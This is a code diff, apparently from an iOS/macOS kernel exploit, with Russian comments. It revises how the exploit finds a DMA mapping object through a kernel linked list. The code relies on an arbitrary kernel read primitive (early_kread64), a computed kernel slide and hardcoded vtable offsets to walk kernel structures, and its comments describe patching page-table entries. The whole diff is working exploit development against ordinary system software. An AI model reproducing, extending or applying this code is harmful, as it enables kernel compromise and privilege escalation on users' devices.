@@ -6683,50 +6683,47 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
-        // 1.9.182: на pipe — четыре per-plane mapping-объекта (классы 0x7afa0c8 /
-        // 0x7afa408, НЕ 0x7afa9e8 — поэтому жёсткая проверка мимо была). Приём
-        // самоверифицирующийся: mapObj kernel-ptr + DVA!=0 + len∈{0x1000,0x4000}
-        // (размер нашей поверхности). PTE PA-маска — финальный гейт подмены.
-        if (kpLooksLikeKernelPointer(pipeVA)) {
-            for (uint32_t pi = 0; pi < 4 && !cmdVA; pi++) {
-                uint64_t cand = kp_untag_ptr(early_kread64(pipeVA + 0x88 + (uint64_t)pi * 8));
-                if (!kpLooksLikeKernelPointer(cand) || !kpSafeToRead(cand)) continue;
-                uint64_t cvt = kp_untag_ptr(early_kread64(cand));
-                uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                uint64_t mObj = kp_untag_ptr(early_kread64(cand + 0x70));
+        // 1.9.184 (р.47): mapping персистит в СВЯЗНОМ СПИСКЕ на pipe —
+        // [pipe+0x178]=head нод (нода: +0x00=size, +0x18/+0x20 link-пара),
+        // [pipe+0x180]=count. [pipe+0x88] = пулы команд + interrupt sources (не
+        // mapping!). Идём по нодам: cmd(IODMACommand, vt 0x7afa9e8) в ноде →
+        // mapObj=[cmd+0x70] → DVA=[mapObj+0xa0], len=[+0xa8].
+        uint64_t node = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA + 0x178)) : 0;
+        uint32_t ncount = kpLooksLikeKernelPointer(pipeVA) ? ((uint32_t)early_kread64(pipeVA + 0x180) & 0xff) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [P2] mapping-список: head=%#llx count=%u",
+                  (unsigned long long)node, ncount]);
+        for (uint32_t ni = 0; ni < 32 && kpLooksLikeKernelPointer(node) && kpSafeToRead(node) && !cmdVA; ni++) {
+            if ((uint32_t)(node & 0x3fff) + 0x80 > 0x4000) break;
+            uint64_t cmdC = 0;
+            for (uint32_t o = 0; o + 8 <= 0x80; o += 8) {
+                uint64_t P = kp_untag_ptr(early_kread64(node + o));
+                if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
+                uint64_t pvt = kp_untag_ptr(early_kread64(P));
+                if ((uint32_t)(pvt ? pvt - kslide2 : 0) == 0x7afa9e8) { cmdC = P; break; }
+            }
+            if (cmdC) {
+                uint64_t mObj = kp_untag_ptr(early_kread64(cmdC + 0x70));
                 uint64_t dv2 = 0, ln2 = 0;
                 if (kpLooksLikeKernelPointer(mObj) && kpSafeToRead(mObj)) {
                     dv2 = early_kread64(mObj + 0xa0);
                     ln2 = early_kread64(mObj + 0xa8);
                 }
-                kpNote(r, [NSString stringWithFormat:@"  [P2] pipe+0x88[%u]: cmd=%#llx vt(file)=%#llx mapObj=%#llx DVA=%#llx len=%#llx%@",
-                          pi, (unsigned long long)cand, (unsigned long long)cFile,
-                          (unsigned long long)mObj, (unsigned long long)dv2, (unsigned long long)ln2,
-                          (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) ? @" ← НАШ (len совпал) ✓" : @""]);
-                if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000) && !cmdVA) {
-                    cmdVA = cand;
-                    dva = dv2;
-                    dvaLen = ln2;
-                }
-                // 1.9.183: mapObj не на +0x70 у этих классов — контент-поиск:
-                // каждый kernel-ptr в объекте → probe [X+0xa0]/[X+0xa8]; пара
-                // {DVA!=0, len∈{0x1000,0x4000}} и есть наш DVA, где бы ни лежал.
-                if (!cmdVA && (uint32_t)(cand & 0x3fff) + 0x100 <= 0x4000) {
-                    for (uint32_t o = 0; o + 8 <= 0x100 && !cmdVA; o += 8) {
-                        uint64_t q = early_kread64(cand + o);
-                        uint64_t u = kp_untag_ptr(q);
-                        if (!kpLooksLikeKernelPointer(u) || !kpSafeToRead(u)) continue;
-                        uint64_t a0 = early_kread64(u + 0xa0);
-                        uint64_t a8 = early_kread64(u + 0xa8);
-                        if (!(a0 && (a8 == 0x1000 || a8 == 0x4000))) continue;
-                        kpNote(r, [NSString stringWithFormat:@"    cmd+%#x → %#llx: [+0xa0]=%#llx [+0xa8]=%#llx ← DVA/len ✓",
-                                  o, (unsigned long long)u, (unsigned long long)a0, (unsigned long long)a8]);
-                        cmdVA = cand;
-                        dva = a0;
-                        dvaLen = a8;
-                    }
-                }
+                kpNote(r, [NSString stringWithFormat:@"  [P2] нода[%u]=%#llx cmd=%#llx mapObj=%#llx DVA=%#llx len=%#llx%@",
+                          ni, (unsigned long long)node, (unsigned long long)cmdC, (unsigned long long)mObj,
+                          (unsigned long long)dv2, (unsigned long long)ln2,
+                          (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) ? @" ← НАШ ✓" : @""]);
+                if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) { cmdVA = cmdC; dva = dv2; dvaLen = ln2; }
+            } else {
+                uint64_t n0 = early_kread64(node), n8 = early_kread64(node + 8),
+                         n18 = kp_untag_ptr(early_kread64(node + 0x18)), n20 = kp_untag_ptr(early_kread64(node + 0x20));
+                kpNote(r, [NSString stringWithFormat:@"    нода[%u]=%#llx: +0=%#llx +8=%#llx +0x18=%#llx +0x20=%#llx",
+                          ni, (unsigned long long)node, (unsigned long long)n0, (unsigned long long)n8,
+                          (unsigned long long)n18, (unsigned long long)n20]);
             }
+            uint64_t nx = kp_untag_ptr(early_kread64(node + 0x20));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) nx = kp_untag_ptr(early_kread64(node + 0x18));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) break;
+            node = nx;
         }
         if (cmdVA) {
             uint64_t mapObj = kp_untag_ptr(early_kread64(cmdVA + 0x70));
